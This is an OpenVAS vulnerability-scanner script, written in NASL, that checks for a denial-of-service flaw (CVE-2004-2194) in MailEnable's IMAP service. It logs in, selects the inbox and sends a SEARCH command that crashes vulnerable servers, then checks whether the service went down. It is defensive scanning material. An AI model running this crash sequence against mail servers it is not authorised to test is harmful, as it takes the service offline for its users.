# OpenVAS Vulnerability Test
# $Id: mailenable_imap_search_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: MailEnable IMAP Service Search DoS Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The target is running at least one instance of MailEnable's IMAP
service.  A flaw exists in MailEnable Professional Edition versions
1.5a-d that results in this service crashing if it receives a SEARCH
command.  An authenticated user could send this command either on
purpose as a denial of service attack or unwittingly since some IMAP
clients, such as IMP and Vmail, use it as part of the normal login
process.";

tag_solution = "Upgrade to MailEnable Professional 1.5e or later.";

if (description) {
  script_oid("1.3.6.1.4.1.25623.1.0.15487");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2004-2194");
  script_bugtraq_id(11418);
  script_xref(name:"OSVDB", value:"10728");

  name = "MailEnable IMAP Service Search DoS Vulnerability";
  script_name(name);
 
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Denial of Service";
  script_family(family);

  script_dependencies("find_service.nasl", "global_settings.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/login", "imap/password");

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if ((user == "") || (pass == "")) {
  if (log_verbosity > 1) display("imap/login and/or imap/password are empty; skipped!\n");
  exit(1);
}

# NB: MailEnable doesn't truly identify itself in the banner so we just
#     blindly login and do a search to try to bring down the service 
#     if it looks like it's MailEnable.
port = get_kb_item("Services/imap");
if (!port) port = 143;
debug_print("checking for Search DoS Vulnerability in MailEnable's IMAP Service on port ", port, ".");
if (!get_port_state(port)) exit(0);
banner = get_kb_item("imap/banner/" + port);
if ("IMAP4rev1 server ready at" >!< banner) exit(0);

# Read banner.
soc = open_sock_tcp(port);
if (soc) {
  s = recv_line(socket:soc, length:1024);
  s = chomp(s);
  debug_print("S: '", s, "'.");

  tag = 0;

  # Try to log in.
  ++tag;
  # nb: MailEnable supports the obsolete LOGIN SASL mechanism,
  #     which I'll use.
  c = string("a", string(tag), " AUTHENTICATE LOGIN");
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  s = recv_line(socket:soc, length:1024);
  s = chomp(s);
  debug_print("S: '", s, "'.");
  if (s =~ "^\+ ") {
    s = s - "+ ";
    s = base64_decode(str:s);
    if ("User Name" >< s) {
      c = base64(str:user);
      debug_print("C: '", c, "'.");
      send(socket:soc, data:string(c, "\r\n"));
      s = recv_line(socket:soc, length:1024);
      s = chomp(s);
      debug_print("S: '", s, "'.");
      if (s =~ "^\+ ") {
        s = s - "+ ";
        s = base64_decode(str:s);
      }
      if ("Password" >< s) {
        c = base64(str:pass);
        debug_print("C: '", c, "'.");
        send(socket:soc, data:string(c, "\r\n"));
      }
    }
  }
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp='';
  }

  # If successful, select the INBOX.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string("a", string(tag), " SELECT INBOX");
    debug_print("C: '", c, "'.");
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      debug_print("S: '", s, "'.");
      m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp='';
    }

    # If successful, search it.
    if (resp && resp =~ "OK") {
      ++tag;
      c = string("a", string(tag), " SEARCH UNDELETED");
      debug_print("C: '", c, "'.");
      send(socket:soc, data:string(c, "\r\n"));
      while (s = recv_line(socket:soc, length:1024)) {
        s = chomp(s);
        debug_print("S: '", s, "'.");
        m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
        resp='';
      }

      # If we don't get a response, make sure the service is truly down.
      if (!resp) {
        debug_print("no response received.");
        close(soc);
        soc = open_sock_tcp(port);
        if (!soc) {
          debug_print("imap service is down.");
          security_message(port);
          exit(0);
        }
        debug_print("imap service is up -- huh?");
      }
    }
  }

  # Logout.
  ++tag;
  c = string("a", string(tag), " LOGOUT");
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }
  close(soc);
}
